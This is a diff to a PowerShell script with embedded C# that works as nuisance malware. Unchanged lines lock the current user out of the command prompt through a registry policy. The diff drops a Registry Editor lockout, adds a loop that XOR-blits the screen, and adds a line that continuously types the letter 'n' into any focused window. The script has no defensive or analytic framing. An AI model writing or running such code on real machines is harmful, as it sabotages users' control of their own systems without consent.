@@ -37,15 +37,11 @@ $disableCmdPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
 New-Item -Path $disableCmdPath -Force | Out-Null
 Set-ItemProperty -Path $disableCmdPath -Name "DisableCMD" -Value 1
 
-# Create registry key to disable Registry Editor
-$disableRegEditPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-New-Item -Path $disableRegEditPath -Force | Out-Null
-Set-ItemProperty -Path $disableRegEditPath -Name "DisableRegistryTools" -Value 1
-
 $source = @"
 using System;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Windows.Forms;
 
 public static class Win32
 {
@@ -89,10 +85,13 @@ public static class Win32
 
             // BitBlt with Raster Operation (ROP) Code for XOR Effect
             BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00660046);
+            
+            // Continuously type "n" into any interactive search bar
+            SendKeys.Send("n");
         }
     }
 }
 "@
 
-Add-Type -TypeDefinition $source -Language CSharp
+Add-Type -TypeDefinition $source -ReferencedAssemblies "System.Windows.Forms.dll"
 [Win32]::ReversePIP()
